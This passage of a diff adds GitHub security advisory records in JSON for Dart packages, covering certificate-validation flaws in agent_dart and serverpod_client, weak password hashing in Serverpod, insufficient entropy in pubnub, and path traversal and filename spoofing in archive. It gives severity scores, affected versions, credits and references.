+          "events_url": "https://api.github.com/users/stuartmorgan-g/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stuartmorgan-g/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:L",
+      "score": 3.0
+    }
+  },
+  {
+    "ghsa_id": "GHSA-fmj7-7gfw-64pg",
+    "cve_id": "CVE-2024-48915",
+    "url": "https://api.github.com/advisories/GHSA-fmj7-7gfw-64pg",
+    "html_url": "https://github.com/advisories/GHSA-fmj7-7gfw-64pg",
+    "summary": "Agent Dart is missing certificate verification checks",
+    "description": "Certificate verification (in [lib/agent/certificate.dart](https://github.com/AstroxNetwork/agent_dart/blob/main/lib/agent/certificate.dart)) has been found to contain two issues:\n   - During the delegation verification (in [_checkDelegation](https://github.com/AstroxNetwork/agent_dart/blob/f50971dfae3f536c1720f0084f28afbcf5d99cb5/lib/agent/certificate.dart#L162) function) the canister_ranges aren't verified. The impact of not checking the canister_ranges is that a subnet can sign canister responses in behalf of another subnet. You have more details in the IC specification [here](https://internetcomputer.org/docs/current/references/ic-interface-spec#certification-delegation). Also for reference you can check how is this implemented in [the agent-rs](https://github.com/dfinity/agent-rs/blob/608a3f4cfdcdfc5ca1ca74a1b9d33f2137a2d324/ic-agent/src/agent/mod.rs#L903-L914).\n    - The certificate’s timestamp, i.e /time path, is not verified, meaning that the certificate effectively has no expiration time. The [IC spec](https://internetcomputer.org/docs/current/references/ic-interface-spec#http-query) doesn’t specify an expiry times, it gives some suggestions, quoting: \"A reasonable expiry time for timestamps in R.signatures and the certificate Cert is 5 minutes (analogously to the maximum allowed ingress expiry enforced by the IC mainnet). Delegations require expiry times of at least a week since the IC mainnet refreshes the delegations only after replica upgrades which typically happen once a week\". For reference you can check how is this implemented in the agent-rs ([here](https://github.com/dfinity/agent-rs/blob/608a3f4cfdcdfc5ca1ca74a1b9d33f2137a2d324/ic-agent/src/agent/mod.rs#L820) and [here](https://github.com/dfinity/agent-rs/blob/608a3f4cfdcdfc5ca1ca74a1b9d33f2137a2d324/ic-agent/src/agent/mod.rs#L876-L887)).\n\n**Additionally**, seems [replica signed queries](https://internetcomputer.org/blog/features/replica-signed-queries) aren’t implemented",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/AstroxNetwork/agent_dart/security-advisories/GHSA-fmj7-7gfw-64pg",
+    "source_code_location": "https://github.com/AstroxNetwork/agent_dart",
+    "identifiers": [
+      {
+        "value": "GHSA-fmj7-7gfw-64pg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-48915",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/AstroxNetwork/agent_dart/security/advisories/GHSA-fmj7-7gfw-64pg",
+      "https://github.com/AstroxNetwork/agent_dart/commit/0d200686aabcd9313c7bc3e675cbdc82f6b775cf",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-48915",
+      "https://github.com/AstroxNetwork/agent_dart/blob/f50971dfae3f536c1720f0084f28afbcf5d99cb5/lib/agent/certificate.dart#L162",
+      "https://github.com/AstroxNetwork/agent_dart/blob/main/lib/agent/certificate.dart",
+      "https://github.com/advisories/GHSA-fmj7-7gfw-64pg"
+    ],
+    "published_at": "2024-10-15T17:33:50Z",
+    "updated_at": "2025-01-23T09:40:22Z",
+    "github_reviewed_at": "2024-10-15T17:33:50Z",
+    "nvd_published_at": "2024-10-15T17:15:11Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "agent_dart"
+        },
+        "vulnerable_version_range": "<= 1.0.0-dev.28",
+        "first_patched_version": "1.0.0-dev.29",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "score": 7.6
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-295",
+        "name": "Improper Certificate Validation"
+      },
+      {
+        "cwe_id": "CWE-347",
+        "name": "Improper Verification of Cryptographic Signature"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "eduarddfinity",
+          "id": 118754595,
+          "node_id": "U_kgDOBxQNIw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/118754595?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/eduarddfinity",
+          "html_url": "https://github.com/eduarddfinity",
+          "followers_url": "https://api.github.com/users/eduarddfinity/followers",
+          "following_url": "https://api.github.com/users/eduarddfinity/following{/other_user}",
+          "gists_url": "https://api.github.com/users/eduarddfinity/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/eduarddfinity/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/eduarddfinity/subscriptions",
+          "organizations_url": "https://api.github.com/users/eduarddfinity/orgs",
+          "repos_url": "https://api.github.com/users/eduarddfinity/repos",
+          "events_url": "https://api.github.com/users/eduarddfinity/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/eduarddfinity/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "AlexV525",
+          "id": 15884415,
+          "node_id": "MDQ6VXNlcjE1ODg0NDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/15884415?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/AlexV525",
+          "html_url": "https://github.com/AlexV525",
+          "followers_url": "https://api.github.com/users/AlexV525/followers",
+          "following_url": "https://api.github.com/users/AlexV525/following{/other_user}",
+          "gists_url": "https://api.github.com/users/AlexV525/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/AlexV525/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/AlexV525/subscriptions",
+          "organizations_url": "https://api.github.com/users/AlexV525/orgs",
+          "repos_url": "https://api.github.com/users/AlexV525/repos",
+          "events_url": "https://api.github.com/users/AlexV525/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/AlexV525/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00368,
+      "percentile": 0.30543
+    }
+  },
+  {
+    "ghsa_id": "GHSA-r75m-26cq-mjxc",
+    "cve_id": "CVE-2024-29886",
+    "url": "https://api.github.com/advisories/GHSA-r75m-26cq-mjxc",
+    "html_url": "https://github.com/advisories/GHSA-r75m-26cq-mjxc",
+    "summary": "Serverpod improved security for stored password hashes",
+    "description": "## Description\n\n### Improved security for stored password hashes\nServerpod now uses the OWASP, [source](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#introduction), recommended Argon2Id password hash algorithm to store password hashes for the email authentication module.\n\nStarting from Serverpod `1.2.6` all users that either creates an account or authenticates with the server will have their password stored using the safer algorithm. No changes are required from the developer to start storing passwords using the safer algorithm.\n\n### Why did we change how passwords are stored?\nAn issue was identified with the old password hash algorithm that made it susceptible to rainbow attacks if the database was compromised.\n\nIt is strongly recommended to migrate your existing password hashes.\n\n### Migrate existing password hashes\nThe email authentication module provides a helper method to migrate all the existing legacy password hashes in the database. Simply call  `Emails.migrateLegacyPasswordHashes(...)` with a session instance as an argument to migrate the password hashes.\n\nThe method is implemented as an idempotent operation and will yield the same result regardless of how many times it is called.\n\nWe recommend either implementing a web server route that can be called remotely or by calling the method as part of starting the server.\n\nFollowing is example code for implementing a web server route.\n\n<details><summary><h4>Web server route code</h4></summary>\n\n```dart\nimport 'dart:io';\n\nimport 'package:serverpod/serverpod.dart';\nimport 'package:serverpod_auth_server/module.dart' as auth;\n\nclass MigratePasswordsRoute extends Route {\n  @override\n  Future<bool> handleCall(Session session, HttpRequest request) async {\n    request.response.writeln(\n      'Migrating legacy passwords, check the server logs for progress updates.',\n    );\n    _migratePasswords(session);\n    return true;\n  }\n}\n\nFuture<void> _migratePasswords(Session session) async {\n  session.log('Starting to migrate passwords.');\n\n  var totalMigratedPasswords = 0;\n  while (true) {\n    try {\n      var entriesMigrated = await auth.Emails.migrateLegacyPasswordHashes(\n        session,\n        // Process 100 database entries at a time\n        batchSize: 100,\n        // Stop after 500 entries have been migrated\n        maxMigratedEntries: 500,\n      );\n\n      totalMigratedPasswords += entriesMigrated;\n      session.log(\n        'Migrated $entriesMigrated password entries, total $totalMigratedPasswords.',\n      );\n\n      if (entriesMigrated == 0) break;\n\n      // Delay to avoid overloading the database\n      await Future.delayed(Duration(seconds: 1));\n    } catch (e) {\n      session.log('Error migrating passwords: $e');\n    }\n  }\n\n  session.log('Finished migrating passwords.');\n}\n```\n\n</details>\n\n### How we migrate existing password hashes\nSince password hashes can’t be recalculated without knowledge of the plain text password, the method in the email authentication module applies the new algorithm to the already stored password hashes.\n\nWhen the affected users later authenticate, their password hash will be calculated using both algorithms in tandem. If the authentication is accepted, the stored password hash will be updated to only use the new algorithm so that further authentication only needs to run the new algorithm.\n\n### Impact\nAll versions of `serverpod_auth_server` pre `1.2.6`\n\n### Patches\nUpgrading to version `1.2.6` resolves this issue.\n",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/serverpod/serverpod/security-advisories/GHSA-r75m-26cq-mjxc",
+    "source_code_location": "https://github.com/serverpod/serverpod",
+    "identifiers": [
+      {
+        "value": "GHSA-r75m-26cq-mjxc",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-29886",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/serverpod/serverpod/security/advisories/GHSA-r75m-26cq-mjxc",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-29886",
+      "https://github.com/serverpod/serverpod/commit/a78b9e9f1de74d1300633a122b6cc0f064139ad6",
+      "https://github.com/advisories/GHSA-r75m-26cq-mjxc"
+    ],
+    "published_at": "2024-03-28T17:53:42Z",
+    "updated_at": "2024-03-28T17:53:42Z",
+    "github_reviewed_at": "2024-03-28T17:53:42Z",
+    "nvd_published_at": "2024-03-27T19:15:49Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "serverpod_auth_server"
+        },
+        "vulnerable_version_range": "< 1.2.6",
+        "first_patched_version": "1.2.6",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-916",
+        "name": "Use of Password Hash With Insufficient Computational Effort"
+      }
+    ],
+    "credits": [
+
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "score": 5.3
+    },
+    "epss": {
+      "percentage": 0.00262,
+      "percentile": 0.17801
+    }
+  },
+  {
+    "ghsa_id": "GHSA-h6x7-r5rg-x5fw",
+    "cve_id": "CVE-2024-29887",
+    "url": "https://api.github.com/advisories/GHSA-h6x7-r5rg-x5fw",
+    "html_url": "https://github.com/advisories/GHSA-h6x7-r5rg-x5fw",
+    "summary": "Serverpod client accepts any certificate",
+    "description": "This bug bypassed the validation of TSL certificates on all none web HTTP clients in the `serverpod_client` package. Making them susceptible to a man in the middle attack against encrypted traffic between the client device and the server. \n\nAn attacker would need to be able to intercept the traffic and highjack the connection to the server for this vulnerability to be used. \n\n### Impact\nAll versions of `serverpod_client` pre `1.2.6`\n\n### Patches\nUpgrading to version `1.2.6` resolves this issue.\n\n",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/serverpod/serverpod/security-advisories/GHSA-h6x7-r5rg-x5fw",
+    "source_code_location": "https://github.com/serverpod/serverpod",
+    "identifiers": [
+      {
+        "value": "GHSA-h6x7-r5rg-x5fw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-29887",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/serverpod/serverpod/security/advisories/GHSA-h6x7-r5rg-x5fw",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-29887",
+      "https://github.com/serverpod/serverpod/commit/d55bf8d12967fc7955a875cb3e0f9693bd6d2c71",
+      "https://github.com/advisories/GHSA-h6x7-r5rg-x5fw"
+    ],
+    "published_at": "2024-03-28T17:53:26Z",
+    "updated_at": "2024-03-28T17:53:27Z",
+    "github_reviewed_at": "2024-03-28T17:53:26Z",
+    "nvd_published_at": "2024-03-27T19:15:49Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "serverpod_client"
+        },
+        "vulnerable_version_range": "< 1.2.6",
+        "first_patched_version": "1.2.6",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 7.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-295",
+        "name": "Improper Certificate Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Skycoder42",
+          "id": 9221346,
+          "node_id": "MDQ6VXNlcjkyMjEzNDY=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/9221346?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Skycoder42",
+          "html_url": "https://github.com/Skycoder42",
+          "followers_url": "https://api.github.com/users/Skycoder42/followers",
+          "following_url": "https://api.github.com/users/Skycoder42/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Skycoder42/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Skycoder42/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Skycoder42/subscriptions",
+          "organizations_url": "https://api.github.com/users/Skycoder42/orgs",
+          "repos_url": "https://api.github.com/users/Skycoder42/repos",
+          "events_url": "https://api.github.com/users/Skycoder42/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Skycoder42/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "score": 7.4
+    },
+    "epss": {
+      "percentage": 0.00284,
+      "percentile": 0.2071
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5844-q3fc-56rh",
+    "cve_id": "CVE-2023-26154",
+    "url": "https://api.github.com/advisories/GHSA-5844-q3fc-56rh",
+    "html_url": "https://github.com/advisories/GHSA-5844-q3fc-56rh",
+    "summary": "pubnub Insufficient Entropy vulnerability",
+    "description": "Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of the package github.com/pubnub/go; versions of the package github.com/pubnub/go/v7 before 7.2.0; versions of the package pubnub before 7.3.0; versions of the package pubnub/pubnub before 6.1.0; versions of the package pubnub before 5.3.0; versions of the package pubnub before 0.4.0; versions of the package pubnub/c-core before 4.5.0; versions of the package com.pubnub:pubnub-kotlin before 7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.\n\n**Note:**\n\nIn order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the encryption.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/pubnub/javascript",
+    "identifiers": [
+      {
+        "value": "GHSA-5844-q3fc-56rh",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-26154",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-26154",
+      "https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119",
+      "https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0",
+      "https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384",
+      "https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372",
+      "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373",
+      "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374",
+      "https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371",
+      "https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380",
+      "https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690",
+      "https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376",
+      "https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385",
+      "https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375",
+      "https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377",
+      "https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378",
+      "https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381",
+      "https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379",
+      "https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70",
+      "https://github.com/advisories/GHSA-5844-q3fc-56rh",
+      "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml",
+      "https://github.com/pubnub/go/commit/428517fef5b901db7275d9f5a75eda89a4c28e08"
+    ],
+    "published_at": "2023-12-06T06:30:20Z",
+    "updated_at": "2025-07-22T15:15:53Z",
+    "github_reviewed_at": "2023-12-06T16:55:26Z",
+    "nvd_published_at": "2023-12-06T05:15:10Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "pubnub"
+        },
+        "vulnerable_version_range": "< 7.4.0",
+        "first_patched_version": "7.4.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "com.pubnub:pubnub-kotlin"
+        },
+        "vulnerable_version_range": "< 7.7.0",
+        "first_patched_version": "7.7.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "com.pubnub:pubnub"
+        },
+        "vulnerable_version_range": "<= 4.6.5",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pubnub/go/v7"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "Pubnub"
+        },
+        "vulnerable_version_range": "< 6.19.0",
+        "first_patched_version": "6.19.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "rubygems",
+          "name": "pubnub"
+        },
+        "vulnerable_version_range": "< 5.3.0",
+        "first_patched_version": "5.3.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "pubnub"
+        },
+        "vulnerable_version_range": "< 0.4.0",
+        "first_patched_version": "0.4.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "pubnub/pubnub"
+        },
+        "vulnerable_version_range": "< 6.1.0",
+        "first_patched_version": "6.1.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "pubnub"
+        },
+        "vulnerable_version_range": "< 4.3.0",
+        "first_patched_version": "4.3.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "pubnub"
+        },
+        "vulnerable_version_range": "< 7.3.0",
+        "first_patched_version": "7.3.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "swift",
+          "name": "github.com/pubnub/swift"
+        },
+        "vulnerable_version_range": "< 6.2.0",
+        "first_patched_version": "6.2.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pubnub/go"
+        },
+        "vulnerable_version_range": "< 0.0.0-20231016150651-428517fef5b9",
+        "first_patched_version": "0.0.0-20231016150651-428517fef5b9",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pubnub/go/v6"
+        },
+        "vulnerable_version_range": "< 6.1.1-0.20231016150651-428517fef5b9",
+        "first_patched_version": "6.1.1-0.20231016150651-428517fef5b9",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pubnub/go/v5"
+        },
+        "vulnerable_version_range": "< 5.0.4-0.20231016150651-428517fef5b9",
+        "first_patched_version": "5.0.4-0.20231016150651-428517fef5b9",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 5.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-331",
+        "name": "Insufficient Entropy"
+      }
+    ],
+    "credits": [
+
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 5.9
+    },
+    "epss": {
+      "percentage": 0.00963,
+      "percentile": 0.60529
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9v85-q87q-g4vg",
+    "cve_id": "CVE-2023-39139",
+    "url": "https://api.github.com/advisories/GHSA-9v85-q87q-g4vg",
+    "html_url": "https://github.com/advisories/GHSA-9v85-q87q-g4vg",
+    "summary": "Path traversal in Archive",
+    "description": "An issue in Archive v3.3.7 allows attackers to execute a path traversal via extracting a crafted zip file.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/brendan-duncan/archive",
+    "identifiers": [
+      {
+        "value": "GHSA-9v85-q87q-g4vg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-39139",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-39139",
+      "https://github.com/brendan-duncan/archive/issues/265",
+      "https://blog.ostorlab.co/zip-packages-exploitation.html",
+      "https://ostorlab.co/vulndb/advisory/OVE-2023-5",
+      "https://github.com/brendan-duncan/archive/commit/6de492385d72af044231c4163dff13a43d991c83",
+      "https://github.com/brendan-duncan/archive/commit/edb0d480733a44d28ff3d5e4e2779153ba645ce7",
+      "https://github.com/advisories/GHSA-9v85-q87q-g4vg"
+    ],
+    "published_at": "2023-08-31T00:30:17Z",
+    "updated_at": "2023-11-06T05:04:31Z",
+    "github_reviewed_at": "2023-08-31T01:42:46Z",
+    "nvd_published_at": "2023-08-30T22:15:09Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "archive"
+        },
+        "vulnerable_version_range": "<= 3.3.7",
+        "first_patched_version": "3.3.8",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kj415j45",
+          "id": 18349191,
+          "node_id": "MDQ6VXNlcjE4MzQ5MTkx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/18349191?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kj415j45",
+          "html_url": "https://github.com/kj415j45",
+          "followers_url": "https://api.github.com/users/kj415j45/followers",
+          "following_url": "https://api.github.com/users/kj415j45/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kj415j45/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kj415j45/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kj415j45/subscriptions",
+          "organizations_url": "https://api.github.com/users/kj415j45/orgs",
+          "repos_url": "https://api.github.com/users/kj415j45/repos",
+          "events_url": "https://api.github.com/users/kj415j45/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kj415j45/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      },
+      {
+        "user": {
+          "login": "jonasfj",
+          "id": 149732,
+          "node_id": "MDQ6VXNlcjE0OTczMg==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/149732?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/jonasfj",
+          "html_url": "https://github.com/jonasfj",
+          "followers_url": "https://api.github.com/users/jonasfj/followers",
+          "following_url": "https://api.github.com/users/jonasfj/following{/other_user}",
+          "gists_url": "https://api.github.com/users/jonasfj/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/jonasfj/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/jonasfj/subscriptions",
+          "organizations_url": "https://api.github.com/users/jonasfj/orgs",
+          "repos_url": "https://api.github.com/users/jonasfj/repos",
+          "events_url": "https://api.github.com/users/jonasfj/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/jonasfj/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    },
+    "epss": {
+      "percentage": 0.00368,
+      "percentile": 0.29501
+    }
+  },
+  {
+    "ghsa_id": "GHSA-r285-q736-9v95",
+    "cve_id": "CVE-2023-39137",
+    "url": "https://api.github.com/advisories/GHSA-r285-q736-9v95",
+    "html_url": "https://github.com/advisories/GHSA-r285-q736-9v95",
+    "summary": "Filename spoofing in archive",
+    "description": "An issue in Archive v3.3.7 allows attackers to spoof zip filenames which can lead to inconsistent filename parsing.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/brendan-duncan/archive",
+    "identifiers": [
+      {
+        "value": "GHSA-r285-q736-9v95",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-39137",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-39137",
+      "https://github.com/brendan-duncan/archive/issues/266",
+      "https://blog.ostorlab.co/zip-packages-exploitation.html",
+      "https://ostorlab.co/vulndb/advisory/OVE-2023-3",
+      "https://github.com/brendan-duncan/archive/commit/0d17b270a3c33d3bed56cadd9a43da7717ab11f4",
+      "https://www.rapid7.com/db/modules/exploit/windows/fileformat/winrar_name_spoofing",
+      "https://github.com/advisories/GHSA-r285-q736-9v95"
+    ],
+    "published_at": "2023-08-31T00:30:17Z",
+    "updated_at": "2024-10-02T13:36:06Z",
+    "github_reviewed_at": "2023-08-31T01:43:38Z",
+    "nvd_published_at": "2023-08-30T22:15:09Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "archive"
+        },
+        "vulnerable_version_range": "<= 3.3.7",
+        "first_patched_version": "3.3.8",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kj415j45",
+          "id": 18349191,
+          "node_id": "MDQ6VXNlcjE4MzQ5MTkx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/18349191?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kj415j45",
+          "html_url": "https://github.com/kj415j45",
+          "followers_url": "https://api.github.com/users/kj415j45/followers",
+          "following_url": "https://api.github.com/users/kj415j45/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kj415j45/gists{/gist_id}",
